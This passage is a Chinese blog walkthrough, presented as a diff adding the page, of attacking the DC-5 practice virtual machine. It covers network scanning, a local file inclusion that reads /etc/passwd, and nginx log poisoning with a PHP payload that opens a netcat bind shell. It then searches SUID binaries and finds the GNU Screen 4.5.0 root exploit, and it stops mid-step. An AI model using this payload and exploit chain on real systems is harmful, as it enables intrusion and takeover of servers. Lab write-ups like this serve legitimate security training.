@@ -1,0 +1,744 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.png">
+  <link rel="mask-icon" href="/images/favicon.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdn.jsdelivr.net/npm/pace-js@1/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atc96.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="DC-5 靶机渗透 1.渗透过程 THEEND!">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-5 靶机渗透">
+<meta property="og:url" content="https://atc96.top/DC-5/index.html">
+<meta property="og:site_name" content="Rex_Surprise">
+<meta property="og:description" content="DC-5 靶机渗透 1.渗透过程 THEEND!">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-10T10:15:58.072Z">
+<meta property="article:author" content="Rex_Surprise">
+<meta property="article:tag" content="网络渗透">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://atc96.top/DC-5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DC-5 靶机渗透 | Rex_Surprise</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Rex_Surprise" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Rex_Surprise</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Welcome to rexSurprise!</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://github.com/rexSurprise" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://atc96.top/DC-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Rex_Surprise">
+      <meta itemprop="description" content="Rex_Surprise的个人博客~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rex_Surprise">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DC-5 靶机渗透
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-10 00:00:00 / 修改时间：18:15:58" itemprop="dateCreated datePublished" datetime="2020-05-10T00:00:00+08:00">2020-05-10</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">靶机渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/DC-5/" class="post-meta-item leancloud_visitors" data-flag-title="DC-5 靶机渗透" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/DC-5/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/DC-5/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <!-- toc -->
+
+<ul>
+<li><a href="#dc-5-靶机渗透">DC-5 靶机渗透</a><ul>
+<li><a href="#1渗透过程">1.渗透过程</a></li>
+<li><a href="#__theend__"><strong>THEEND!</strong></a></li>
+</ul>
+</li>
+</ul>
+<!-- tocstop -->
+
+<a id="more"></a>
+
+<h1><span id="dc-5-靶机渗透">DC-5 靶机渗透</span></h1><h2><span id="1渗透过程">1.渗透过程</span></h2><ul>
+<li>开始，扫描主机：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.0.1/24</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到一个 <code>192.168.0.149   00:0c:29:cb:31:5f      1      60  VMware, Inc.</code></p>
+</li>
+<li><p>扫端口：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -A -p- 192.168.0.149</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>扫描结果：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-26 14:36 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.149</span><br><span class="line">Host is up (0.0019s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx 1.6.2</span><br><span class="line">|_http-server-header: nginx/1.6.2</span><br><span class="line">|_http-title: Welcome</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp  rpcbind</span><br><span class="line">|   100024  1          38192/tcp  status</span><br><span class="line">|_  100024  1          47477/udp  status</span><br><span class="line">38192/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">MAC Address: 00:0C:29:CB:31:5F (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>只有开启了 <code>80 http     111:RPC     38192:RPC</code></p>
+</li>
+<li><p>在下载的时候看到的描述:</p>
+</li>
+<li><blockquote>
+<p>  As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.<br>  据我所知，只有一个可利用的入口点（也没有SSH）。这个特定的入口点可能很难识别，但它就在那里。你需要寻找一些不寻常的东西（随着页面刷新而改变的东西）。这将有希望提供一些关于脆弱性可能涉及到什么的想法。</p>
+</blockquote>
+</li>
+<li><p>我们需要寻找 &gt;&gt; <code>随着页面刷新而改变的东西</code></p>
+</li>
+<li><p>翻翻他的网页最后在 提交留言之后的页面 &gt;&gt;</p>
+</li>
+<li><p><a href="http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?firstname=11&amp;lastname=11&amp;country=britain&amp;subject=111</a></p>
+</li>
+<li><p>找到他的底部的 <code>Copyright © 2019</code></p>
+</li>
+<li><p>年份会变化,那也不知道哪里有漏洞啊</p>
+</li>
+<li><p>先给他爆破个目录:</p>
+</li>
+<li><p>然后爆出来:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">200 OK-----http://192.168.0.149//index.php</span><br><span class="line">200 OK-----http://192.168.0.149//contact.php</span><br><span class="line">200 OK-----http://192.168.0.149//faq.php</span><br><span class="line">200 OK-----http://192.168.0.149//footer.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>前面的几个都在页面上有的</p>
+</li>
+<li><p>我们去看看这个:<a href="http://192.168.0.149//footer.php" target="_blank" rel="noopener">http://192.168.0.149//footer.php</a></p>
+</li>
+<li><p>内容和<code>thankyou.php</code>的底部一样的文字</p>
+</li>
+<li><p>刷新一下年份也会变化</p>
+</li>
+<li><p>那可能就是<code>thankyou.php</code>包含了<code>footer.php</code></p>
+</li>
+<li><p>先试试 <a href="http://192.168.0.149/thankyou.php?page=footer.php" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?page=footer.php</a></p>
+</li>
+<li><p>没区别再试试<a href="http://192.168.0.149/thankyou.php?page=/etc/passwd" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?page=/etc/passwd</a></p>
+</li>
+<li><p>也没啥区别,再试试 <a href="http://192.168.0.149/thankyou.php?file=/etc/passwd" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/etc/passwd</a></p>
+</li>
+<li><p>发现底部包含进来了!!!</p>
+</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span> </span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span> </span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> List <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin </span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> Bug-Reporting System (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> </span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> Time Synchronization,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/bin/false</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> Network </span><br><span class="line">Management,,,<span class="symbol">:/run/systemd/netif</span><span class="symbol">:/bin/false</span> </span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">105</span><span class="symbol">:systemd</span> Resolver,,,<span class="symbol">:/run/systemd/resolve</span><span class="symbol">:/bin/false</span> </span><br><span class="line">systemd-bus-<span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">106</span><span class="symbol">:systemd</span> Bus Proxy,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/bin/false</span> Debian-<span class="symbol">exim:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">109</span><span class="symbol">:</span><span class="symbol">:/var/spool/exim4</span><span class="symbol">:/bin/false</span> </span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/var/run/dbus</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">statd:</span><span class="symbol">x:</span><span class="number">106</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/var/lib/nfs</span><span class="symbol">:/bin/false</span></span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">107</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/var/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">dc:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:dc</span>,,,<span class="symbol">:/home/dc</span><span class="symbol">:/bin/bash</span> <span class="symbol">mysql:</span><span class="symbol">x:</span><span class="number">108</span><span class="symbol">:</span><span class="number">113</span><span class="symbol">:MySQL</span></span><br><span class="line">Server,,,<span class="symbol">:/nonexistent</span><span class="symbol">:/bin/false</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>有<code>本地文件包含漏洞(LFI)</code> 好办了 ^_^</p>
+</li>
+<li><p>我们试试日志注入:</p>
+</li>
+<li><p>前面 <code>nmap</code> 扫出web服务器是 <code>nginx 1.6.2</code></p>
+</li>
+<li><p>然后 nginx默认的访问日志在: <code>/var/log/nginx/access.log</code></p>
+</li>
+<li><p>直接输入: <a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a> 验证一下</p>
+</li>
+<li><p>真包含进来了~ <strong>(ps:前面的爆破会产生大量日志内容,可能导致读不出内容,建议在爆破之前给靶机来个快照)</strong></p>
+</li>
+<li><p>我们直接用nc去连接他的80端口:</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/workspace<span class="comment"># nc 192.168.0.149 80</span></span><br><span class="line"><span class="comment">#直接写一个直连的shellcode</span></span><br><span class="line">GET &lt;?php system(<span class="string">'nc -lvp 13123 -e /bin/bash'</span>);?&gt; HTTP/1.1</span><br><span class="line"><span class="comment">#下面的自己生成的</span></span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Server: nginx/1.6.2</span><br><span class="line">Date: Sat, 25 Apr 2020 17:33:49 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 172</span><br><span class="line">Connection: close</span><br><span class="line"><span class="comment"># 返回信息:</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=<span class="string">"white"</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.6.2&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后我们再访问:<a href="http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log" target="_blank" rel="noopener">http://192.168.0.149/thankyou.php?file=/var/log/nginx/access.log</a></p>
+</li>
+<li><p>这时候会一直加载出不来页面就说明成功了</p>
+</li>
+<li><p>服务器就会开启监听 <code>13123</code> 端口 ,直接用<code>nc 192.168.0.149 13123</code> 就可以得到shell 了</p>
+</li>
+<li><p>得到shell了 再让他来个标准控制台</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>得到标准控制台之后 就要想办法提权了</p>
+</li>
+<li><p>先看看用户目录,发现只有一个<code>dc</code> 用户有用户目录</p>
+</li>
+<li><p>里面啥也没有 再翻翻 <code>/tmp</code> 文件夹 也没</p>
+</li>
+<li><p>先看看suid 的提权 </p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找出suid的文件</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/screen-4.5.0</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>百度才知道 :<code>screen-4.5.0</code> 有一个提权漏洞</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation  </span><br><span class="line">| exploits/linux/<span class="built_in">local</span>/41154.sh                                                                        </span><br><span class="line">GNU Screen 4.5.0 - Local Privilege Escalation (PoC)  </span><br><span class="line">| exploits/linux/<span class="built_in">local</span>/41152.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>找到两个文件 直接用那个sh文件吧</p>
+</li>
+<li><p>可以到自己的kali 运行一下,会产生两个文件并获得<code>rootshell</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x 1 root root  1152 4月  26 15:57 41154.sh</span><br><span class="line">-rwxr-xr-x 1 root root 16136 4月  26 15:57 libhax.so</span><br><span class="line">-rwxr-xr-x 1 root root 16824 4月  26 15:57 rootshell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>然后我们用kali写一个sh文件: <code>vim /tmp/run.sh</code></p>
+</li>
+<li><p>内容是:</p>
